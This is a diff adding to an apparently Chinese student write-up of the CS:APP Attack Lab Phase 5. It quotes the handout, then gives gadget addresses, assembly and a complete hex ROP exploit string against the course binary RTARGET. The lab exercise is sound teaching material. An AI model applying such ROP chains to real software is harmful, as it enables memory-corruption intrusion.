@@ -345,6 +345,11 @@ PASS: Would have posted the following:
 
 #### Phase5(Extra Phase)
 
+摘录一段老爷子的话：
+
+> Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
+> Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.
+
 目的：使用ROP实现Phase3
 
 要求与建议：
@@ -397,5 +402,77 @@ fa 18 40 00 00 00 00 00 //
 35 39 62 39 39 37 66 61
 ```
 
-不正确
+**结果不正确，原因：栈随机化使得无法提前获得字符串的地址**
 
+修正：拿到rsp后进行动态偏移
+
+[1. 知乎用户@Yannick的答案](https://zhuanlan.zhihu.com/p/104340864)(**个人认为不够标准，因为使用了不在farm范围内的gadget，5e**)
+
+构造如下的情况：
+
+```
+1.拿到rsp存的地址
+2.对这个地址进行加减常量运算，使其指向cookie的地址
+3.把这个地址放到rdi中
+4.调用touch3
+即 %rdi = %rsp + bias = address of cookie
+```
+
+关键指令为:
+
+```asm
+0x401a06:
+	mov %rsp, %rax
+	retq
+0x4019a2:
+	mov %rax, %rdi
+	retq
+0x401383:
+	pop %rsi
+	retq
+0x4019d6:
+	lea (%rdi, %rsi, 1), %rax
+	retq
+```
+
+则答案为：
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 //0x401a06
+a2 19 40 00 00 00 00 00 //0x4019a2, %rdi = rax = rsp
+83 13 40 00 00 00 00 00 //将栈顶元素pop至rsi
+30 00 00 00 00 00 00 00	//rsi = 0x30
+d6 19 40 00 00 00 00 00 //rax = rdi + rsi
+a2 19 40 00 00 00 00 00 //rdi = rax
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+
+经验证后答案正确
+
+
+
+2.改进：
+
+```
+使用pop rax而不是pop rsi，前者可在farm范围内找到，地址为0x4019ab
+将偏移地址存储到rax后
+movl eax, edx
+movl edx, ecx
+movl ecs, rsi
+即可将rax的值传递到rsi
+之后的过程与上述相同
+```
+
+
+
+## 3.实验心得
+
++ 感觉都不难，但是phase1,2,3,5都没有独立完成，phase4想了很久，完成98%，最后因一对数字混乱而出错很遗憾
++ [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) 有机会可以学一学
++ 不止实验提到的farm内的地址可以作为gadget，任何一个地址只要组合得当都可以得到类似的结果，应放开眼界
